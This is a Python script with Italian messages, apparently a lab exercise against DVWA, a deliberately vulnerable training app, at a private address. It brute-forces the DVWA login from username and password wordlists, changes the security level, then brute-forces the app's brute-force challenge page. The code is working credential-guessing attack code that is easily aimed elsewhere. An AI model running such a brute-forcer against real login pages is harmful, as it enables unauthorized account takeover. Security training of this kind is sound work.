import os
import requests
from colorama import Fore, Style, init


init()


file_username = input("Inserisci il nome del file dell'username: ")
file_password = input("Inserisci il nome del file delle password: ")


if not os.path.isfile(file_username):
    print(Fore.RED + f"Il file {file_username} non esiste." + Style.RESET_ALL)
    exit(1)

if not os.path.isfile(file_password):
    print(Fore.RED + f"Il file {file_password} non esiste." + Style.RESET_ALL)
    exit(1)


with open(file_username, 'r') as file:
    lista_username = [line.strip() for line in file.readlines()]

with open(file_password, 'r') as file:
    lista_password = [line.strip() for line in file.readlines()]


indirizzo_ip = "192.168.50.101"
url_login = f"http://{indirizzo_ip}/dvwa/login.php"

print("Inizio dei tentativi di login all'indirizzo:", url_login)

sessione = requests.Session()


login_success = False
for username in lista_username:
    for password in lista_password:
        print(Fore.YELLOW + f"Tentativo con: {username} - {password}" + Style.RESET_ALL)

        dati_login = {'username': username, 'password': password, 'Login': 'Login'}

        risposta = sessione.post(url_login, data=dati_login)

        if "Login failed" not in risposta.text:
            print(Fore.GREEN + f"Login riuscito con le credenziali: {username} - {password}" + Style.RESET_ALL)
            login_success = True
            break
    if login_success:
        break

if not login_success:
    print(Fore.RED + "Nessun login riuscito con le credenziali fornite." + Style.RESET_ALL)
    exit(1)


url_sicurezza = f"http://{indirizzo_ip}/dvwa/security.php"
livello_sicurezza = input("Scegli il livello di sicurezza (low, medium, high): ")
dati_sicurezza = {'security': livello_sicurezza, 'seclev_submit': 'Submit'}

risposta = sessione.post(url_sicurezza, data=dati_sicurezza)
if risposta.status_code == 200:
    print(Fore.GREEN + "Livello di sicurezza cambiato con successo" + Style.RESET_ALL)
else:
    print(Fore.RED + "Errore nel cambio del livello di sicurezza." + Style.RESET_ALL)

# Brute-force login
url_forza_bruta = f"http://{indirizzo_ip}/dvwa/vulnerabilities/brute/"
print("Prova di login all'URL:", url_forza_bruta)

for username in lista_username:
    for password in lista_password:
        print(Fore.YELLOW + f"Tentativo di login con: {username} - {password}" + Style.RESET_ALL)
        url_con_credenziali = f"{url_forza_bruta}?username={username}&password={password}&Login=Login"
        risposta = sessione.get(url_con_credenziali)

        if "Username and/or password incorrect." not in risposta.text:
            print(Fore.GREEN + f"Login riuscito con username: {username} e password: {password}" + Style.RESET_ALL)
            break
    else:
        continue
    break
